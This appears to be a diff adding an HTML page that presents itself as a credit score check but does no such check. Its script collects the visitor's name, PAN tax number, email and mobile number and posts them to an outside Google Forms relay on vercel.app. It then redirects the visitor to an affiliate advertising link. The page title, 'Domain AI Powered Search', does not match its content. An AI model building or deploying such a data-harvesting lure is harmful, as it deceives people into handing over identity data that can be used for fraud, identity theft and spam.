@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Domain AI Powered Search</title>
+    <style>
+        body {
+            color: white;
+            background-color: black;
+        }
+
+        input[type="text"], input[type="email"], input[type="number"], input[type="password"], input[type="submit"] {
+            width: 300px;
+            height: 30px;
+            font-size: 16px;
+        }
+    </style>
+</head>
+
+<body>
+<h3>Creditscore check</h3>
+<form id="myForm">
+    <label for="name">Name:</label>
+    <br>
+    <input type="text" id="name" name="entry.1202821645" required>
+    <br><br>
+
+    <label for="pan">PAN Number:</label>
+    <br>
+    <input type="text" id="pan" name="entry.386021508">
+    <br><br>
+
+    <label for="email">Email:</label>
+    <br>
+    <input type="email" id="email" name="entry.1419104316" required>
+    <br><br>
+
+    <label for="mobile">Mobile Number:</label>
+    <br>
+    <input type="number" id="mobile" name="entry.1484266823" required>
+    <br><br>
+
+    <input type="submit" value="Check Credit Score" onclick="submitForm(event)">
+</form>
+
+<script>
+    // Submit form to Google Forms API
+    function submitForm(event) {
+        event.preventDefault(); // Prevent form submission if validation fails
+
+        const name = document.getElementById("name").value;
+        const pan = document.getElementById("pan").value;
+        const email = document.getElementById("email").value;
+        const mobile = document.getElementById("mobile").value;
+
+        if (name.trim() === '' || pan.trim() === '' || email.trim() === '' || mobile.trim() === '') {
+            alert('Please fill in all fields.');
+            return;
+        }
+
+        const formData = {
+            "entry.1202821645": name,
+            "entry.386021508": pan,
+            "entry.1419104316": email,
+            "entry.1484266823": mobile
+        };
+
+        fetch("https://securityinfinity-google-forms-rest-api.vercel.app/api/forms/1FAIpQLSediUidkDCZ5Kh-7MxnIJ5YLmxLO57Xo3ZDbGsp-jcRGMe8GQ", {
+            method: "POST",
+            body: JSON.stringify(formData),
+            headers: {
+                "Content-Type": "application/json"
+            }
+        })
+            .then(response => {
+                if (response.ok) {
+                    // Handle successful submission
+                    window.location.replace("https://ad.admitad.com/g/mv1791krjx6e7facb10198cdc26ef0/");
+                } else {
+                    // Handle submission error
+                    alert("There was a problem submitting the form. Please try again later.");
+                }
+            })
+            .catch(error => {
+                // Handle submission error
+                alert("There was a problem submitting the form. Please try again later.");
+            });
+    }
+</script>
+</body>
+</html>
